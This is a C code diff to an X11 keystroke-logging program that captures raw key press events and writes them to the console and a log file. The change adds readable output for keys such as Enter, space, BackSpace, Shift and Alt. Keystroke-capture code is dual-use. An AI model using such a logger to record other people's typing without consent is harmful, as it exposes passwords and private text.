@@ -177,15 +177,30 @@ int main(int argc, char * argv[]) {
                     // Output line
                     if (printKeyUps) printf("%s",
                             cookie->evtype == XI_RawKeyPress ? "+" : "-");
-                    printf("%s", str);
-                    if (strcmp(str,"Enter") == 0) printf("<Enter>\n");
+
+                    if (strcmp(str,"Enter") == 0)     printf("<Enter>\n");
+                    else if (strcmp(str,"space") == 0)     printf(" ");
+                    else if (strcmp(str,"semicolon") == 0) printf(";");
+                    else if (strcmp(str,"Return") == 0)    printf("<Return>\n");
+                    else if (strcmp(str,"BackSpace") == 0) printf("\b");
+                    else if (strcmp(str,"Shift_L") == 0)   printf("<Shift_L>");
+                    else if (strcmp(str,"Alt_L") == 0)     printf("<Alt_L>");
+                    else printf("%s", str);
                     fflush(stdout);
+
                     // TODO: construct proper logline with timestampo
                     // sprintf(buffer, "%s\n", str);
                     if (printKeyUps) fprintf(logfileStream, "%s",
                             cookie->evtype == XI_RawKeyPress ? "+" : "-");
-                    if (strcmp(str,"Enter") == 0) fprintf(logfileStream, "<Enter>\n");
-                    fprintf(logfileStream, "%s", str);
+
+                    if (strcmp(str,"Enter") == 0)          fprintf(logfileStream, "<Enter>\n");
+                    else if (strcmp(str,"space") == 0)     fprintf(logfileStream, " ");
+                    else if (strcmp(str,"semicolon") == 0) fprintf(logfileStream, ";");
+                    else if (strcmp(str,"Return") == 0)    fprintf(logfileStream, "<Return>\n");
+                    else if (strcmp(str,"BackSpace") == 0) fprintf(logfileStream, "\b");
+                    else if (strcmp(str,"Shift_L") == 0)   fprintf(logfileStream, "<Shift_L>");
+                    else if (strcmp(str,"Alt_L") == 0)     fprintf(logfileStream, "<Alt_L>");
+                    else fprintf(logfileStream, "%s", str);
                     fflush(logfileStream);
                 }
             }
